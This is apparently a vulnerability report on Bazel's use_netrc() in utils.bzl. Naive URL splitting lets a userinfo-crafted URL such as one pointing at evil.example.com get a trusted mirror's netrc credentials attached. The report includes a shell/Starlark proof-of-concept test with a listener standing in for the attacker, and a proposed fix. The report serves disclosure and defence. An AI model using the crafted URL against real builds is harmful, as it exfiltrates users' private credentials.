### Title
Netrc host-matching in `use_netrc()` mis-parses URL userinfo, leaking scoped credentials to an attacker-controlled host - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
`use_netrc()` derives the "host" for `.netrc` credential lookup with naive string splitting instead of proper URI parsing. A URL containing userinfo (`user:password@host` syntax) is misparsed so that the segment before `@` — which can be crafted to equal a trusted host that has netrc credentials configured — is treated as the request host, while the real HTTP connection is made to the attacker's host after `@`. Because the returned auth entry is keyed to the exact URL string and forwarded verbatim to `ctx.download()`, Bazel attaches the trusted host's Basic-Auth/bearer credentials to a request that is actually sent to the attacker's server.

### Finding Description
`use_netrc(netrc, urls, patterns)` computes the credential-lookup host like this: [1](#0-0) 

`host = schemerest[1].split("/")[0].split(":")[0]` only strips a trailing port; it never accounts for a userinfo component (`user[:password]@host`) that is valid in the authority component of an HTTP(S) URL. For a URL such as:

```
https://mirror.corp.com:secrettoken@evil.example.com/archive.tar.gz
```

- `schemerest[1].split("/")[0]` → `mirror.corp.com:secrettoken@evil.example.com`
- `.split(":")[0]` → `mirror.corp.com`

So `use_netrc` believes the request targets `mirror.corp.com` — a host the victim has `.netrc` credentials for (e.g. an internal Artifactory/mirror) — and builds a Basic/pattern `Authorization` entry keyed to the **full, unmodified URL string**: [2](#0-1) 

That `auth` dict is passed straight through to `ctx.download()`/`ctx.download_and_extract()` by every helper that calls `get_auth()` (used by `http_archive`, `http_file`, `http_jar`, and custom `download_remote_files`): [3](#0-2) [4](#0-3) 

Because the URL is passed unmodified to the download machinery, the actual TCP/TLS connection is opened against the authority host as parsed by a standards-compliant URL parser — i.e., `evil.example.com`, with `mirror.corp.com:secrettoken` treated as (largely ignored) userinfo. The `Authorization` header that Bazel attaches, however, still carries the real `mirror.corp.com` netrc login/password, so those credentials are transmitted to `evil.example.com`.

The origin of the malicious URL string need not be a locally-trusted BUILD/MODULE.bazel file: `urls`/`url` values commonly come from Bzlmod module `source.json` entries served by any registry a user has added (`--registry` / `common --registry` in `.bazelrc`, or extension-populated repos), from `http_archive`'s mirror/urls lists populated by remote resources, or from module extensions that build URL lists out of untrusted data. Any of those hostile origins can supply an attacker-crafted URL, matching the "hostile registry/mirror" attacker model.

### Impact Explanation
This is a credential-exfiltration primitive: netrc credentials scoped by the user for one host (often an internal, trusted mirror or artifact registry) get sent, via a normal HTTPS Authorization header, to a server the attacker fully controls. Downloaded content still needs to satisfy `sha256`/`integrity` checks to be trusted for the build, but the credential leak occurs purely from making the outbound authenticated request — it does not depend on the attacker's response passing integrity checks.

### Likelihood Explanation
Exploitability requires:
1. The victim has netrc credentials configured for some host reachable via `get_auth`/`use_netrc` (common for private mirrors/registries in corporate CI).
2. The victim resolves at least one dependency (`http_archive`/`http_file`/`http_jar`, or a custom rule built on `download_remote_files`) whose URL list is influenced by an untrusted/attacker-controlled source (a non-default or compromised Bazel registry, an `http_archive` mirror list, or a repo rule constructing URLs from untrusted registry metadata).
No special privileges beyond publishing/serving that URL string are needed by the attacker; the victim's own netrc file supplies the sensitive host/credential pairing.

### Recommendation
Replace the manual authority parsing in `use_netrc()` with a proper URI/URL parser that separates scheme, userinfo, host, and port per RFC 3986, and match netrc entries strictly against the parsed `host` (never against any string that could include user-supplied userinfo). Additionally, reject or strip userinfo components from download URLs before dispatching them to `ctx.download()`, since Bazel's HTTP layer should not accept ambiguous `user:pass@host` authority forms from untrusted URL sources at all.

### Proof of Concept
Extend the existing netrc test harness (`src/test/shell/bazel/starlark_repository_test.sh`, pattern used by `test_netrc_overrides_starlark_headers`) with a malicious-userinfo URL and a second listening server standing in for the attacker host:

```bash
function test_netrc_userinfo_host_confusion_leaks_credentials() {
  cat > .netrc <<'EOF'
machine mirror.corp.com
login corpuser
password CORPSECRET
EOF

  # attacker-controlled server, dumps whatever headers it receives
  serve_file_header_dump attacker_payload.txt attacker_headers.json

  cat > test.bzl <<EOF
load("@bazel_tools//tools/build_defs/repo:utils.bzl", "read_netrc", "use_netrc")

def _impl(repository_ctx):
  # crafted URL: netrc host as userinfo, real connection goes to attacker
  url = "http://mirror.corp.com:x@127.0.0.1:$nc_port/attacker_payload.txt"
  netrc = read_netrc(repository_ctx, repository_ctx.attr.netrc)
  auth = use_netrc(netrc, [url], {})
  repository_ctx.file("BUILD")
  repository_ctx.download(
    url = url,
    output = "out.txt",
    auth = auth,
  )

repo = repository_rule(implementation=_impl, attrs = {"netrc": attr.label(default = ":.netrc")})
EOF

  bazel build @foo//:all || fail "expected bazel to succeed"

  # Assert the attacker's server received the victim's corp credentials
  assert_contains '"Authorization": "Basic '"$(echo -n corpuser:CORPSECRET | base64)"'"' \
      "${TEST_TMPDIR}/attacker_headers.json"
}
```

This demonstrates that credentials scoped to `mirror.corp.com` in `.netrc` are transmitted to the attacker-operated listener bound to `127.0.0.1:$nc_port`, confirming the host-confusion/credential-exfiltration bypass rooted in `use_netrc()`'s naive authority parsing. [5](#0-4)

```text
def use_netrc(netrc, urls, patterns):
    """Compute an auth dict from a parsed netrc file and a list of URLs.

    Args:
      netrc: a netrc file already parsed to a dict, e.g., as obtained from
        read_netrc
      urls: a list of URLs.
      patterns: optional dict of url to authorization patterns

    Returns:
      dict suitable as auth argument for ctx.download; more precisely, the dict
      will map all URLs where the netrc file provides login and password to a
      dict containing the corresponding login, password and optional authorization pattern,
      as well as the mapping of "type" to "basic" or "pattern".
    """
    auth = {}
    for url in urls:
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue

        if host in patterns:
            auth_dict = {
                "type": "pattern",
                "pattern": patterns[host],
            }

            if "login" in authforhost:
                auth_dict["login"] = authforhost["login"]

            if "password" in authforhost:
                auth_dict["password"] = authforhost["password"]

            auth[url] = auth_dict
        elif "password" in authforhost:
            if "login" in authforhost:
                auth[url] = {
                    "type": "basic",
                    "login": authforhost["login"],
                    "password": authforhost["password"],
                }
            else:
                auth[url] = {
                    "type": "pattern",
                    "pattern": "Bearer <password>",
                    "password": authforhost["password"],
                }
        else:
            # buildifier: disable=print
            print("WARNING: Found machine in .netrc for URL %s, but no password." % url)

    return auth
```

```text
def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
        auth_patterns = ctx.attr.auth_patterns
    return use_netrc(netrc, urls, auth_patterns)
```
